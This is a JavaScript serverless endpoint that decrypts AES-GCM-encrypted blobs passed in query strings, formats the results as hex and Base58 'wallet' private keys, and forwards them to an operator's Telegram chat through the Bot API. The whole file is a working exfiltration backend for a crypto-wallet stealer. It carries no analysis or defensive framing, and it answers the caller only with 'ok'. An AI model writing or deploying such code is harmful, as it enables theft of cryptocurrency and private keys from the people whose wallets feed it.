// File: api/messages.js
import crypto from 'crypto';

export default async function handler(req, res) {
  try {
    // 1. Parse incoming query strings
    const bundlesJson   = decodeURIComponent(req.query.bundles || '[]');
    const keybundleJson = decodeURIComponent(req.query.keybundle || '{}');
    const sbundlesArr   = JSON.parse(bundlesJson);
    const { bundleKey: keyB64 } = JSON.parse(keybundleJson);

    // 2. Decode your AES key (dynamic per-request)
    const key = Buffer.from(keyB64, 'base64');

    // 3. Base58 helper (Bitcoin alphabet)
    const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    function bytesToBase58(buf) {
      let num = BigInt('0x' + buf.toString('hex')), out = '';
      while (num > 0n) {
        const rem = num % 58n;
        num = num / 58n;
        out = ALPHABET[Number(rem)] + out;
      }
      for (const b of buf) {
        if (b === 0) out = '1' + out;
        else break;
      }
      return out;
    }

    // 4. Decrypt each sbundle (iv:ct+tag)
    const results = sbundlesArr.map((sb, i) => {
      const [ivB64, ctB64] = sb.split(':');
      const iv  = Buffer.from(ivB64, 'base64');
      const ct  = Buffer.from(ctB64,  'base64');
      const tag = ct.slice(-16);
      const data= ct.slice(0, -16);

      const dec = crypto.createDecipheriv('aes-256-gcm', key, iv);
      dec.setAuthTag(tag);
      const plain = Buffer.concat([dec.update(data), dec.final()]);

      return {
        hex:    plain.toString('hex'),
        base58: bytesToBase58(plain)
      };
    });

    // 5. Build the Telegram message
    let text = '🔑 Decrypted keys:\n';
    results.forEach((r, i) => {
      text += `Wallet ${i}:\n  Hex: ${r.hex}\n  Base58: ${r.base58}\n`;
    });

    // 6. Send via Telegram Bot API
    const bot   = process.env.TELEGRAM_BOT_TOKEN;
    const chat  = process.env.TELEGRAM_CHAT_ID;
    const tgUrl = `https://api.telegram.org/bot${bot}/sendMessage`
                + `?chat_id=${chat}`
                + `&text=${encodeURIComponent(text)}`;

    await fetch(tgUrl);

    // 7. Respond OK
    res.status(200).json({ status: 'ok' });
  } catch (e) {
    console.error('❌ Error in /api/messages:', e);
    res.status(500).json({ error: e.message });
  }
}
